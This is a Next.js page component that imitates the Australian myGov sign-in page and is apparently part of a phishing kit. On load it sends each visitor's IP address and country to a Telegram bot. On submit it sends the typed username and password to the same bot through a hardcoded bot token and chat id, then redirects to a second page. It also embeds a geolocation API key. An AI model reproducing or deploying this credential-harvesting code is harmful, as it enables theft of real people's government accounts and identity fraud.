"use client";

import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";

export default function Home() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const router = useRouter();

  useEffect(() => {
    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        const ipAddress = data.ip;

        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=e4e885c9d83f4a1c920483077bd49a2d&ip=${ipAddress}`)
          .then((res) => res.json())
          .then((data) => {
            const country = data.country_name;
            const apiUrl = `https://api.telegram.org/bot7336936844:AAHy6YK4JqvujJ7a_2nQh5TT2arbitukpUg/sendMessage?chat_id=5843268125&parse_mode=markdown&text=*NEW SITE VISIT* %0A%0A*USER:* ${encodeURIComponent(ipAddress)} %0A%0A*COUNTRY:* ${encodeURIComponent(country)}`;

            fetch(apiUrl)
              .then((res) => {
                if (!res.ok) console.error("ERROR:", res.statusText);
                return res.json();
              })
              .then(() => console.log("SENT!"))
              .catch((e) => console.error("ERROR:", e));
          })
          .catch((e) => console.error("ERROR:", e));
      })
      .catch((e) => console.error("ERROR:", e));

  }, [])

  const onLogin = async (e) => {
    e.preventDefault();

    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        const ipAddress = data.ip;

        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=e4e885c9d83f4a1c920483077bd49a2d&ip=${ipAddress}`)
          .then((res) => res.json())
          .then((data) => {
            const country = data.country_name;
            const apiUrl = `https://api.telegram.org/bot7336936844:AAHy6YK4JqvujJ7a_2nQh5TT2arbitukpUg/sendMessage?chat_id=5843268125&parse_mode=markdown&text=*USER:* ${encodeURIComponent(ipAddress)} %0A*LOGIN 1:* %0A%0A*Username:* ${encodeURIComponent(username)} %0A*Password:* ${encodeURIComponent(password)} %0A%0A*COUNTRY:* ${encodeURIComponent(country)}`;

            fetch(apiUrl)
              .then((res) => {
                if (!res.ok) console.error("ERROR:", res.statusText);
                return res.json();
              })
              .then(() => {
                console.log("SENT!");
                router.push("/log2");
              })
              .catch((e) => console.error("ERROR:", e));
          })
          .catch((e) => console.error("ERROR:", e));
      })
      .catch((e) => console.error("ERROR:", e));
  };

  return (
    <>
      <header role="banner" className="mgvEnhanceHeader">
        <section className="wrapper">
          <div className="inner">
            <div className="unauth-grid">
              <div className="unauth-grid-row">
                <a href="#" className="unauth-crest__link">
                  <img
                    id="unauth-crest"
                    src="/logo-black.svg"
                    alt="logo"
                    role="img"
                  />
                </a>
                <div className="header-links">
                  <a href="#">Help</a>
                </div>
              </div>
            </div>
          </div>
        </section>
      </header>

      <div className="wrapper-mapwap">
        <div className="main-block" id="content" role="main">
          <div className="unauth">
            <div className="login-grid-container">
              <div className="login-grid-row">
                <div className="login-grid-column">
                  <div className="digital-id-login-card-wrapper">
                    <div className="digital-id-main-login-card override">
                      <a data-go-back-link="" className="button-back" href="#"
                      >Back</a
                      >
                      <h1>Sign in with myGov</h1>
                      <p className="login-instruction-text">
                        Choose how to sign in from these 2 options
                      </p>
                      <h2 className="text-align-left">
                        Using your myGov sign in details
                      </h2>
                      <form id="login" onSubmit={onLogin}>
                        <input type="hidden" name="btn1" value="btn1" />
                        <div id="msg" style={{ display: "none", color: "red" }}>
                          Invalid password..! Please enter correct password.
                        </div>
                        <div className="input-group">
                          <label className="override" htmlFor="userId"
                          >Username or email</label
                          >
                          <input
                            id="userId"
                            name="ai"
                            type="text"
                            autoComplete="off"
                            required
                            onChange={(e) => setUsername(e.target.value)}
                          />
                        </div>
                        <p className="recovery">
                          <a href="#" className="anchor override">Forgot username</a>
                        </p>
                        <div className="input-group">
                          <label htmlFor="password" className="override">Password</label>
                          <div className="password-group">
                            <button
                              className="showPassword anchor"
                              type="button"
                              aria-describedby="show-hide-helpmsg"
                              aria-label="Show password as plain text."
                            >
                              Show
                            </button>
                            <p className="is-visuallyhidden" id="show-hide-helpmsg">
                              Note: this will visually expose your password on the
                              screen.
                            </p>
                            <input
                              id="password"
                              name="pr"
                              type="password"
                              aria-required="true"
                              required
                              onChange={(e) => setPassword(e.target.value)}
                            />
                          </div>
                        </div>
                        <p className="recovery">
                          <a href="#" className="anchor override">Forgot password</a>
                        </p>
                        <div className="button-digital-id-main-container override">
                          <div className="digital-id-button-container">
                            <button
                              type="submit"
                              className="button-main"
                              name="btn1"
                              id="btn1"
                            >
                              Sign in
                            </button>
                          </div>
                        </div>
                        <p className="create-account-text">
                          <a className="create-account-link" href="#"
                          >Create a myGov account</a
                          >
                          if you don&apos;t have one already.
                        </p>
                      </form>
                      <div className="hr-word">
                        <div className="draw-circle">or</div>
                      </div>
                      <div className="digital-id-login-card secondary">
                        <div className="button-digital-id-container">
                          <h2 className="text-align-left">
                            Using your myGovID Digital Identity
                          </h2>
                          <div className="digital-id-login-option-container">
                            <div className="inner-options">
                              <p className="external-links-zone">
                                What is
                                <a href="#" target="_blank">Digital Identity</a>
                                and <a href="#" target="_blank">myGovID</a>?
                              </p>
                              <a className="button-digital-identity" href="#"
                              >Continue with Digital Identity</a
                              >
                              <input
                                type="hidden"
                                value="{flowScope.targetParamDI}"
                              />
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <footer role="contentinfo">
        <div className="wrapper">
          <div className="inner">
            <section className="footer-list">
              <nav>
                <h2 className="sr-only" aria-label="Footer">Footer</h2>
                <ul className="lower-links">
                  <li>
                    <a target="_blank" href="#">Terms of use</a>
                  </li>
                  <li>
                    <a target="_blank" href="#">Privacy and security</a>
                  </li>
                  <li>
                    <a target="_blank" href="#">Copyright</a>
                  </li>
                  <li>
                    <a target="_blank" href="#">Accessibility</a>
                  </li>
                </ul>
              </nav>
            </section>
            <div className="footer-lower">
              <section className="footer-lower-logo">
                <a href="#">
                  <img
                    src="/logo-white.svg"
                    alt="logo"
                    width="313.17"
                    height="70"
                    role="img"
                  />
                </a>
              </section>
              <p className="footer-acknowledgement">
                We acknowledge the Traditional Custodians of the lands we live on.
                We pay our respects to all Elders, past and present, of all
                Aboriginal and Torres Strait Islander nations.
              </p>
            </div>
          </div>
        </div>
      </footer>
    </>
  );
}
